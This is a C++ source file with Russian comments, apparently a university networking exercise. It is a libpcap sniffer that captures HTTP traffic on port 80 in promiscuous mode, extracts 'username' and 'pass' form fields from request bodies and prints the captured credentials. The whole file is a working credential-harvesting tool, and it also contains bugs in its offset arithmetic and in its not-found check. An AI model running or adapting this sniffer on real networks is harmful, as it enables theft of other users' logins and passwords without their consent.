// g++ -std=c++11 -lpcap main.cpp -o sniffer
//sudo ./sniffer
//https://en.wikipedia.org/wiki/ANSI_escape_code#graphics

#include <iostream>
#include <string.h>
#include <pcap.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define MAXBYTESTOCAPTURE 65535 //Этого количества хватит, чтобы принять любой пакет из любой сети
#define ETHERNET_HEADERS_LENGTH 14
#define IP_ADDR_OFFSET 12
using namespace std;

string get_content_type(string http);
int get_content_length(string http);
string get_login_and_pass(string content);

#pragma pack(push,1)
//переделано из /usr/include/netinet/ip.h
struct IpHeader
{
/*!*/   uint8_t header_length:4;
    uint8_t version:4;
    uint8_t type_of_service;
    uint16_t total_length;
    uint16_t identificator;
    uint16_t flags_fragment_offset;
    uint8_t time_of_live;
    uint8_t protocol;
    uint16_t checksum;
/*!*/
    char ip_src[4];
    char ip_dst[4];
    // options, tcp header, padding
};

//переделано из /usr/include/netinet/tcp.h
struct TCPHeader
  {
    u_int16_t th_sport;		/* source port */
    u_int16_t th_dport;		/* destination port */
    u_int32_t th_seq;		/* sequence number */
    u_int32_t th_ack;		/* acknowledgement number */
    u_int8_t th_x2:4;		/* (unused) */
/*!*/
    u_int8_t header_len:4;		/* data offset */
    u_int8_t th_flags;
    u_int16_t th_win;		/* window */
    u_int16_t th_sum;		/* checksum */
    u_int16_t th_urp;		/* urgent pointer */
};
#pragma pack(pop)

IpHeader *ip_header = nullptr;
TCPHeader *tcp_header = nullptr;

string http_header= "";
string content = "";
string content_type = "";
int content_length;

//Вычленить Content-Type и Content-Length
void parse_header()
{
    //http_header gloabal
    int start = http_header.find("Content-Type");
    if(start == string::npos){
        cout << "Content-Type: \033[31mno\033[0m" << endl;
        content_length = 0;
        return;
    }
    start += 14; //Длина строки "Content-Type: " = 14
    int num_of_chars = http_header.find("\r\n", start) - start;
    cout << "Content-Type: " << http_header.substr(start, num_of_chars) << endl;

    start = http_header.find("Content-Length: ");
    if(start==string::npos){
        cout << "Content-Length: \033[31mno\033[0m" << endl;
        content_length = 0;
        return;
    }
    start += 16; //Длина строки "Content-Length: " = 16
    int num_of_digits = http_header.find("\r\n", start) - start;
    content_length = stoi(http_header.substr(start, num_of_digits)); //global var
    cout << "Content-Length: " << content_length << endl;
}

void parse_content()
{
    //global string content, content_length
    int log_pos = content.find("username");
    int pass_pos = content.find("pass");
    if(log_pos == string::npos || log_pos == string::npos){
        cout << "\033[31mLogin And Password not found\033[0m" << endl;
        return;
    }
    log_pos += 9; //len("username=") == 9
    pass_pos += 5; //len("pass=") == 5
    int log_len = 0;
    for(int i = log_pos; i < content_length && content[i] !='&'; ++i, ++log_len);
    cout << "Login:\n\tKey: username\n\tValue: \033[32m" << content.substr(log_pos, log_len) << "\033[0m\n";

    int pass_len = 0;
    for(int i = pass_pos; i < content_length && content[i] !='&'; ++i, ++pass_len);
    cout << "Password:\n\tKey: pass\n\tValue: \033[32m" << content.substr(pass_pos, pass_len) << "\033[0m\n";
}

void processPacket(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char *packet){
    int headers_len = ETHERNET_HEADERS_LENGTH;
    ip_header = (IpHeader *)(packet + headers_len);    //offset = ethernet

    headers_len += ip_header->header_length * 4;
    cout << "Source IP: " << inet_ntoa(*(struct in_addr*)ip_header->ip_src) << endl;
    cout << "Destination IP: " << inet_ntoa(*(struct in_addr*)ip_header->ip_dst) << endl;

    tcp_header = (TCPHeader *)(packet + headers_len);   //offset = ethernet+ip
    headers_len = tcp_header->header_len * 4;           //offset = ethernet+ip+tcp

    int payload_lim = pkthdr->caplen - headers_len;
    content = string((const char *)packet + headers_len, payload_lim); //Вырезали поле данных
    int http_data_pos = content.find("\r\n\r\n"); //В HTTP поле данных отделено min 1 пустой строкой
    if (http_data_pos == string::npos) {
        cout << "\033[31mEmpty data\033[0m" << endl;
        cout << "________________________________\n" << endl;
        return;
    }
    http_header = content.substr(0, http_data_pos);
    parse_header(); //Выводится значения Content-Type и Content-Length, заполняется content_length;
    content = content.substr(http_data_pos, content_length);
    parse_content();
    cout << "________________________________\n" << endl;
}

int main(int argc, const char * argv[])
{
    char errorBuffer[PCAP_ERRBUF_SIZE] = {'\0'};
    char *device = nullptr;
    pcap_t *descriptor = nullptr;
    char *settings = (char *)"tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)"; //(*)
    //char *settings = (char *)"host students.bmstu.ru";
    //char *settings = (char *)"port http";
    bpf_u_int32 netp, maskp;
    struct bpf_program filter;

    //Получение имени устройства
    device = pcap_lookupdev((char *)errorBuffer);
    if(!device) {
        cout << "pcap_lookupdev(): " << errorBuffer << endl;
        exit(1);
    }
    cout << device << endl;

    //Получение сетевого адреса и маски сети для устройства
    pcap_lookupnet(device, &netp, &maskp, (char *)errorBuffer);


    //Открытие устройства в  promiscuous-режиме
    descriptor = pcap_open_live(device, MAXBYTESTOCAPTURE, 1, 512, (char *)errorBuffer);
    if(!descriptor) {
        cout << "pcap_open_live(): " << errorBuffer << endl;
        exit(1);
    }
    //Составление выражения фильтрации
    if(pcap_compile(descriptor, &filter, settings, 0, maskp) == -1) { //netp было почему-то
        cout << "Error calling pcap_compile\n" << endl;
        exit(1);
    }
    //Запись фильтра в структуру (BPF-программа)
    pcap_setfilter(descriptor, &filter);

    //Бесконечный цикл
    pcap_loop(descriptor, -1, processPacket, nullptr);
//    pcap_close(descr);

    return 0;
}

//(*)    To select all IPv4 HTTP packets to and from port 80, i.e. print only packets that contain data, not, for example, SYN and FIN packets and ACK-only packets. (IPv6 is left as an exercise for the reader.)
//    tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)
//    http://www.tcpdump.org/manpages/pcap-filter.7.html
